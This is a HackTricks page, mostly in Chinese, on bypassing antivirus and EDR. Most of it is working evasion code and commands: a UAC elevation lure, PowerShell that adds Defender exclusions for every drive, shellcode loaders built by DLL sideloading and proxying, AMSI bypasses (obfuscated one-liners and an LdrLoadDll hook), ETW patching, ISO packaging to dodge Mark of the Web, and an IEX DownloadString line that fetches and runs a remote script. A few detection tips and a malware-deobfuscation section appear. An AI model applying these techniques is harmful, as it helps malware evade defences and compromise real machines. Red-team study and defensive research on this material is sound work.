# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**本页作者：** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## 停用 Defender

- [defendnot](https://github.com/es3n1n/defendnot): 一个用于使 Windows Defender 停止工作的工具。
- [no-defender](https://github.com/es3n1n/no-defender): 一个用于通过伪装成另一个 AV 来使 Windows Defender 停止工作的工具。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

伪装成游戏作弊工具的公共加载器通常以未签名的 Node.js/Nexe 安装程序发布，首先会 **请求用户提升权限**，然后才使 Defender 无效。流程很简单：

1. 使用 `net session` 探测是否在管理员上下文中。该命令只有在调用者具有管理员权限时才会成功，因此失败表明加载器在以普通用户身份运行。
2. 使用 `RunAs` 动词立即重新启动自身以触发预期的 UAC 同意提示，同时保留原始命令行。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
受害者已经相信他们正在安装“cracked”软件，因此提示通常会被接受，给予恶意软件更改 Defender 的策略所需的权限。

### 为每个驱动器字母设置全面的 `MpPreference` 排除项

一旦获得提权，GachiLoader-style 链条会最大化 Defender 的盲点，而不是直接禁用该服务。加载器首先终止 GUI watchdog (`taskkill /F /IM SecHealthUI.exe`)，然后推送 **极其宽泛的排除**，使每个用户配置文件、系统目录和可移动磁盘都变得无法扫描：
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
主要观察：

- 循环会遍历每个挂载的文件系统 (D:\, E:\, USB sticks 等)，因此 **以后放在磁盘任何位置的 payload 都会被忽略**。
- `.sys` 扩展名的排除是面向未来的——攻击者保留日后加载 unsigned drivers 的选项，而无需再次触及 Defender。
- 所有更改都落在 `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 下，这让后续阶段可以确认这些排除项是否持续存在或在不重新触发 UAC 的情况下扩展它们。

因为没有停止任何 Defender 服务，简单的健康检查仍会报告 “antivirus active”，即使实时检测从未触及那些路径。

## **AV Evasion Methodology**

目前，AV 使用不同的方法来判断文件是否恶意：静态检测、动态分析，以及对于更高级的 EDRs，行为分析。

### **Static detection**

静态检测通过标记已知的恶意字符串或二进制/脚本中的字节数组来实现，也会从文件本身提取信息（例如 file description、company name、digital signatures、icon、checksum 等）。这意味着使用已知的公共工具更容易被抓到，因为它们很可能已经被分析并被标记为恶意。有几种方法可以绕过这类检测：

- **Encryption**

如果你对二进制文件进行加密，AV 就无法检测到你的程序，但你需要某种 loader 在内存中解密并运行该程序。

- **Obfuscation**

有时只需更改二进制或脚本中的一些字符串即可通过 AV，但具体要混淆的内容不同，可能会是个耗时的工作。

- **Custom tooling**

如果你开发自己的工具，就不会有已知的坏签名，但这需要大量时间和精力。

> [!TIP]
> 一个用于检测 Windows Defender 静态检测的好方法是 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上将文件分割成多个片段，然后让 Defender 分别扫描每一段，这样它可以准确告诉你二进制中被标记的字符串或字节是什么。

我强烈建议你查看这个 [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)，关于实用的 AV Evasion 的内容。

### **Dynamic analysis**

动态分析是指 AV 在沙箱中运行你的二进制并观察是否有恶意活动（例如尝试解密并读取浏览器密码、对 LSASS 执行 minidump 等）。这部分可能更难对付，但你可以采取一些措施来规避沙箱。

- **Sleep before execution** 根据实现方式不同，这是绕过 AV 的动态分析的一个好方法。为了不打断用户的工作流，AV 对扫描文件的时间通常非常短，因此使用长时间的 sleep 可能会干扰二进制的分析。但问题是，许多 AV 的 sandboxes 可以根据实现跳过 sleep。
- **Checking machine's resources** 通常沙箱可用的资源很少（例如 < 2GB RAM），否则它们可能会减慢用户的机器。你也可以在这里非常有创意，例如检查 CPU 的温度或风扇转速，沙箱并不会实现所有检测。
- **Machine-specific checks** 如果你想针对某个加入了 "contoso.local" 域的用户工作站，可以检查计算机的域是否匹配指定值，如果不匹配，就让程序退出。

事实证明，Microsoft Defender 的 Sandbox 计算机名是 HAL9TH，所以你可以在恶意程序触发前检查计算机名；如果名字匹配 HAL9TH，就说明你在 defender 的 sandbox 中，可以让程序退出。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

一些来自 [@mgeeky](https://twitter.com/mariuszbit) 的非常好的对抗 Sandboxes 的建议

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

如本文之前所述，**public tools** 最终会被 **检测到**，所以你应该问自己一个问题：

例如，如果你想 dump LSASS，**你真的需要使用 mimikatz 吗**？还是可以使用一个不那么出名但也能 dump LSASS 的其它项目。

正确的答案很可能是后者。以 mimikatz 为例，它可能是被 AV 和 EDRs 标记最多的项目之一，尽管这个项目本身非常酷，但要用它来绕过 AV 却极其困难，所以只需为你要实现的目标寻找替代方案即可。

> [!TIP]
> 在修改 payload 以实现规避时，确保在 defender 中关闭自动样本提交，并且，真的，**不要把样本上传到 VIRUSTOTAL**，如果你的目标是长期实现规避。如果你想检查某个 AV 是否检测到你的 payload，可以在 VM 上安装该 AV，尝试关闭自动样本提交，并在那里测试直到你对结果满意。

## EXEs vs DLLs

只要可能，总是 **优先使用 DLLs 来规避检测**。以我的经验，DLL 文件通常 **被检测和分析的概率远低于 EXE**，因此在某些情况下这是一个非常简单的避免检测的技巧（前提是你的 payload 有办法以 DLL 形式运行）。

如图所示，Havoc 的一个 DLL Payload 在 antiscan.me 的检测率为 4/26，而 EXE payload 的检测率为 7/26。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

下面我们将展示一些可与 DLL 文件配合使用以提高隐蔽性的技巧。

## DLL Sideloading & Proxying

**DLL Sideloading** 利用 loader 使用的 DLL 搜索顺序，通过将受害应用和恶意 payload(s) 放置在一起达到目的。

你可以使用 [Siofra](https://github.com/Cybereason/siofra) 和下面的 powershell 脚本来检查易受 DLL Sideloading 影响的程序：
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
该命令将输出位于 "C:\Program Files\\" 内易受 DLL hijacking 的程序列表，以及它们尝试加载的 DLL 文件。

我强烈建议你 **亲自探索 DLL Hijackable/Sideloadable 程序**，正确执行时该技术相当隐蔽，但如果你使用已公开的 DLL Sideloadable 程序，就可能很容易被发现。

仅仅通过放置一个具有程序期望加载名称的恶意 DLL，不会加载你的载荷，因为程序期望该 DLL 中包含某些特定的函数。为了解决这个问题，我们将使用另一种技术，称为 **DLL Proxying/Forwarding**。

**DLL Proxying** 将程序从代理（恶意）DLL 发出的调用转发到原始 DLL，从而保持程序功能并能够处理你的载荷执行。

我将使用来自 [@flangvik](https://twitter.com/Flangvik/) 的 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 项目。

以下是我遵循的步骤：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最后一个命令会给我们 2 个文件：一个 DLL 源代码模板，以及重命名后的原始 DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode（用 [SGN](https://github.com/EgeBalci/sgn) 编码）和代理 DLL 在 [antiscan.me](https://antiscan.me) 上的检测率均为 0/26！我会称之为成功。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 我**强烈推荐**你观看 [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL Sideloading 的内容，也可以看 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) 来更深入地了解我们讨论的内容。

### 滥用转发导出 (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- 如果尚未加载，则加载 `TargetDll`
- 从中解析 `TargetFunc`

关键行为需要理解：
- 如果 `TargetDll` 是 KnownDLL，则它从受保护的 KnownDLLs 命名空间提供（例如 ntdll、kernelbase、ole32）。
- 如果 `TargetDll` 不是 KnownDLL，则使用常规的 DLL 搜索顺序，其中包括执行转发解析的模块所在目录。

这就实现了一种间接的 sideloading primitive：找到一个已签名的 DLL，它导出一个转发到非 KnownDLL 模块名的函数，然后将该已签名 DLL 与一个由攻击者控制且名称完全与转发目标模块相同的 DLL 放在同一目录。当调用该转发导出时，加载器会解析该转发并从相同目录加载你的 DLL，执行你的 DllMain。

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` 不是 KnownDLL，因此按常规搜索顺序解析。

PoC (copy-paste):
1) 将已签名的系统 DLL 复制到可写文件夹
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 在同一文件夹中放置恶意的 `NCRYPTPROV.dll`。一个最小的 DllMain 就足以获得 code execution；你不需要实现 forwarded function 来触发 DllMain。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 使用已签名的 LOLBin 触发转发：
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32（已签名）加载 side-by-side 的 `keyiso.dll`（已签名）
- 在解析 `KeyIsoSetAuditingInterface` 时，加载器会遵循转发到 `NCRYPTPROV.SetAuditingInterface`
- 然后加载器从 `C:\test` 加载 `NCRYPTPROV.dll` 并执行其 `DllMain`
- 如果 `SetAuditingInterface` 未实现，你只有在 `DllMain` 已运行之后才会收到 "missing API" 错误

Hunting tips:
- 关注那些 forwarded exports，其目标模块不是 KnownDLL 的情况。KnownDLLs 列在 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 下。
- 你可以使用如下工具枚举 forwarded exports：
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 查看 Windows 11 forwarder inventory 以搜索候选: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- 监控 LOLBins（例如 rundll32.exe）从非系统路径加载签名的 DLL，然后从该目录加载具有相同基名的非-KnownDLLs
- 对如下进程/模块链触发告警：`rundll32.exe` → 非系统 `keyiso.dll` → `NCRYPTPROV.dll`（位于用户可写路径下）
- 实施代码完整性策略（WDAC/AppLocker），并在应用程序目录中禁止 write+execute

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze 是一个 payload toolkit，用于通过 suspended processes、direct syscalls 和 alternative execution methods 绕过 EDRs`

你可以使用 Freeze 以隐蔽方式加载并执行你的 shellcode。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 规避只是一个猫捉老鼠的游戏，今天有效的方法明天可能就被检测到，因此不要只依赖一个工具，尽可能尝试串联多种 evasion 技术。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs often place **user-mode inline hooks** on `ntdll.dll` syscall stubs. To bypass those hooks, you can generate **direct** or **indirect** syscall stubs that load the correct **SSN** (System Service Number) and transition to kernel mode without executing the hooked export entrypoint.

**Invocation options:**
- **Direct (embedded)**: emit a `syscall`/`sysenter`/`SVC #0` instruction in the generated stub (no `ntdll` export hit).
- **Indirect**: jump into an existing `syscall` gadget inside `ntdll` so the kernel transition appears to originate from `ntdll` (useful for heuristic evasion); **randomized indirect** picks a gadget from a pool per call.
- **Egg-hunt**: avoid embedding the static `0F 05` opcode sequence on disk; resolve a syscall sequence at runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: infer SSNs by sorting syscall stubs by virtual address instead of reading stub bytes.
- **SyscallsFromDisk**: map a clean `\KnownDlls\ntdll.dll`, read SSNs from its `.text`, then unmap (bypasses all in-memory hooks).
- **RecycledGate**: combine VA-sorted SSN inference with opcode validation when a stub is clean; fall back to VA inference if hooked.
- **HW Breakpoint**: set DR0 on the `syscall` instruction and use a VEH to capture the SSN from `EAX` at runtime, without parsing hooked bytes.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (反恶意软件扫描接口)

AMSI 是为防止 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" 而创建的。最初，AVs 只能扫描 **磁盘上的文件（files on disk）**，所以如果你能以某种方式直接在内存中执行 payload（**直接在内存中执行（directly in-memory）**），AV 就无法阻止，因为它没有足够的可见性。

AMSI 功能集成于 Windows 的这些组件中。

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

它允许 antivirus 解决方案通过以未加密且未混淆的形式暴露脚本内容来检查脚本行为。

运行 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` 会在 Windows Defender 上产生如下警报。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

注意它如何在前面加上 `amsi:`，然后是脚本运行的可执行文件路径，在此例中为 powershell.exe。

我们没有将任何文件写入磁盘，但仍然因 AMSI 在内存中被检测到。

此外，从 **.NET 4.8** 开始，C# 代码也会经过 AMSI 扫描。这甚至影响到 `Assembly.Load(byte[])` 用于加载内存中执行。因此，如果你想规避 AMSI，建议使用较低版本的 .NET（例如 4.7.2 或更低）进行内存执行。

有几种方法可以绕过 AMSI：

- **Obfuscation**

由于 AMSI 主要依赖静态检测，因此，修改你尝试加载的脚本可能是规避检测的一个好方法。

不过，AMSI 具备对脚本进行去混淆的能力，即使有多层混淆也能还原，因此混淆的效果取决于具体实现，有时并不是一个好选项。这使得规避并不那么简单。不过，有时你只需改变几个变量名就能通过，所以这取决于被标记的程度。

- **AMSI Bypass**

由于 AMSI 通过将一个 DLL 注入到 powershell（以及 cscript.exe、wscript.exe 等）进程来实现，即使以非特权用户运行也可以相对容易地篡改它。由于 AMSI 实现中的这一缺陷，研究人员发现了多种规避 AMSI 扫描的方法。

**Forcing an Error**

强制 AMSI 初始化失败（amsiInitFailed）将导致当前进程不会启动任何扫描。最初这由 [Matt Graeber](https://twitter.com/mattifestation) 披露，Microsoft 已经开发签名以防止更广泛的使用。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
只需要一行 powershell 代码就能使当前 powershell 进程中的 AMSI 无法使用。当然，这行代码已经被 AMSI 本身标记为可疑，所以需要对其进行一些修改才能使用该技术。

下面是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 取得的一个已修改的 AMSI bypass。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
请记住，一旦这篇文章发布，可能会被标记，因此如果你的计划是保持未被检测，切勿发布任何代码。

**Memory Patching**

该技术最初由 [@RastaMouse](https://twitter.com/_RastaMouse/) 发现，过程是查找 amsi.dll 中的 "AmsiScanBuffer" 函数地址（负责扫描用户提供的输入），并用返回 E_INVALIDARG 代码的指令覆盖它。这样，实际扫描的返回值会变为 0，且被解释为清洁的结果。

> [!TIP]
> 请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以获得更详细的说明。

还有许多通过 powershell 绕过 AMSI 的其他技术，查看 [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) 和 [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) 以了解更多。

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI 只有在 `amsi.dll` 被加载到当前进程之后才会初始化。一个稳健且与语言无关的绕过方法是在 `ntdll!LdrLoadDll` 上放置一个用户模式钩子，当请求的模块是 `amsi.dll` 时返回错误。这样，AMSI 就永远不会加载，该进程也不会进行扫描。

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
说明
- 适用于 PowerShell、WScript/CScript 和自定义 loader（以及任何会加载 AMSI 的情形）。
- 可配合通过 stdin 提供脚本（`PowerShell.exe -NoProfile -NonInteractive -Command -`）使用，以避免长命令行遗留痕迹。
- 已见于通过 LOLBins 执行的 loader（例如，`regsvr32` 调用 `DllRegisterServer`）。

该工具 **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** 也会生成用于绕过 AMSI 的脚本。  
该工具 **[https://amsibypass.com/](https://amsibypass.com/)** 也会生成用于绕过 AMSI 的脚本，通过随机化用户定义的函数、变量、字符表达式，并对 PowerShell 关键字应用随机大小写以规避签名检测。

**移除检测到的签名**

你可以使用诸如 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 和 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 的工具，从当前进程的内存中移除检测到的 AMSI 签名。该工具通过扫描当前进程内存以查找 AMSI 签名，然后用 NOP 指令覆盖它，从而有效地将其从内存中移除。

**使用 AMSI 的 AV/EDR 产品**

你可以在 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 找到使用 AMSI 的 AV/EDR 产品列表。

**使用 PowerShell 版本 2**

如果使用 PowerShell 版本 2，AMSI 将不会被加载，因此可以运行脚本而不被 AMSI 扫描。你可以这样做：
```bash
powershell.exe -version 2
```
## PS 日志

PowerShell logging 是一个功能，允许你记录系统上执行的所有 PowerShell 命令。这对于审计和故障排查很有用，但对于想要规避检测的攻击者来说也会是一个 **问题**。

要绕过 PowerShell 日志，你可以使用以下技术：

- **Disable PowerShell Transcription and Module Logging**：你可以使用像 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 这样的工具来实现。
- **Use Powershell version 2**：如果使用 PowerShell version 2，AMSI 将不会被加载，因此你可以在不被 AMSI 扫描的情况下运行脚本。可以这样做：`powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**：使用 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 来生成一个没有防护的 PowerShell 会话（this is what `powerpick` from Cobal Strike uses）。


## 混淆

> [!TIP]
> 几种混淆技术依赖于加密数据，这会增加二进制的熵，从而更容易被 AVs 和 EDRs 检测到。对此要小心，或许只对代码中敏感或需要隐藏的部分应用加密。

### Deobfuscating ConfuserEx-Protected .NET Binaries

在分析使用 ConfuserEx 2（或其商业分支）的恶意软件时，通常会遇到多层保护，阻止反编译器和沙箱。下面的流程可以可靠地 **恢复接近原始的 IL**，之后可在 dnSpy 或 ILSpy 等工具中反编译为 C#。

1. 反篡改移除 – ConfuserEx 会加密每个 *method body* 并在 *module* 的静态构造函数 (`<Module>.cctor`) 中解密。这也会修补 PE 校验和，因此任何修改都会导致二进制崩溃。使用 **AntiTamperKiller** 来定位被加密的元数据表，恢复 XOR 密钥并重写为干净的程序集：
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
输出包含 6 个反篡改参数（`key0-key3`、`nameHash`、`internKey`），在构建自有 unpacker 时可能有用。

2. 符号/控制流恢复 – 将 *clean* 文件交给 **de4dot-cex**（一个支持 ConfuserEx 的 de4dot 分支）。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
参数：
• `-p crx` – 选择 ConfuserEx 2 的 profile  
• de4dot 将撤销控制流扁平化，恢复原始的命名空间、类和变量名，并解密常量字符串。

3. 代理调用剥离 – ConfuserEx 用轻量级包装器（又名 *proxy calls*）替换直接方法调用以进一步破坏反编译。使用 **ProxyCall-Remover** 将它们移除：
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
完成此步骤后，你应该能看到正常的 .NET API（例如 `Convert.FromBase64String` 或 `AES.Create()`），而不是不透明的包装函数（如 `Class8.smethod_10`，…）。

4. 手动清理 – 在 dnSpy 中运行生成的二进制，搜索大的 Base64 数据块或 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 的使用，以定位 *真实* 载荷。恶意软件通常将其作为 TLV 编码的字节数组存放，初始化于 `<Module>.byte_0`。

上述步骤在不需要运行恶意样本的情况下 **恢复执行流** —— 在离线工作站上分析时很有用。

> 🛈  ConfuserEx 会生成一个名为 `ConfusedByAttribute` 的自定义属性，可作为 IOC 用于自动分类样本。

#### 一行命令
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目的目标是提供 [LLVM](http://www.llvm.org/) 编译套件的开源分支，通过 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和 tamper-proofing 提高软件安全性。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 展示了如何使用 `C++11/14` 语言在编译时生成 obfuscated code，而无需使用任何外部工具或修改编译器。
- [**obfy**](https://github.com/fritzone/obfy): 通过 C++ template metaprogramming framework 添加一层 obfuscated operations，使试图破解应用的人更难以应对。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 binary obfuscator，能够对多种不同的 PE 文件进行 obfuscate，包括: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame 是一个用于任意可执行文件的简单 metamorphic code engine。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator 是一个针对 LLVM 支持语言的细粒度代码 obfuscation 框架，使用 ROP (return-oriented programming)。ROPfuscator 在汇编级别通过将常规指令转换为 ROP chains 来 obfuscate 程序，从而破坏我们对正常控制流的直观理解。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt 是用 Nim 编写的 .NET PE Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor 能够将现有的 EXE/DLL 转换为 shellcode 然后加载它们

## SmartScreen & MoTW

当你从互联网上下载并执行一些可执行文件时，可能会看到这个屏幕。

Microsoft Defender SmartScreen 是一种安全机制，旨在保护最终用户免于运行潜在的恶意应用程序。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen 主要采用基于信誉的方式来工作，这意味着不常被下载的应用会触发 SmartScreen，从而提示并阻止最终用户执行该文件（尽管仍可以通过点击 More Info -> Run anyway 来执行该文件）。

**MoTW** (Mark of The Web) 是一个名为 Zone.Identifier 的 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)，在从互联网下载文件时会自动创建，同时记录下载来源的 URL。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>

> [!TIP]
> 重要的是要注意，使用受信任的签名证书签名的可执行文件**不会触发 SmartScreen**。

一种非常有效的防止你的 payloads 获得 Mark of The Web 的方法是将它们打包到某种容器中，例如 ISO。这是因为 Mark-of-the-Web (MOTW) **不能** 应用于 **非 NTFS** 卷。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一个将 payloads 打包到输出容器中以规避 Mark-of-the-Web 的工具。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) 是 Windows 中一种强大的日志机制，允许应用和系统组件**记录事件**。但安全产品也可利用它来监控并检测恶意活动。

类似于禁用（绕过）AMSI，也可以让用户态进程的 **`EtwEventWrite`** 函数立即返回而不记录任何事件。这通过在内存中修补该函数使其立即返回来实现，从而有效地禁用该进程的 ETW 日志。

更多信息请参阅 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) 和 [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**。


## C# Assembly Reflection

将 C# 二进制加载到内存中已为人所知很久，仍然是运行后渗透工具而不被 AV 捕获的好方法。

因为有效载荷会直接加载到内存而不接触磁盘，我们只需考虑为整个进程修补 AMSI。

大多数 C2 框架（sliver、Covenant、metasploit、CobaltStrike、Havoc 等）已经提供直接在内存中执行 C# 程序集的能力，但有不同的方法来实现：

- **Fork\&Run**

它涉及**生成一个牺牲进程**，将你的后渗透恶意代码注入该新进程，执行恶意代码，完成后终止该进程。这既有优点也有缺点。fork and run 方法的好处是执行发生在我们的 Beacon implant 进程**之外**。这意味着如果我们的后渗透操作出错或被发现，我们的**implant**更有可能存活。缺点是你有**更大几率**被 **Behavioural Detections** 发现。

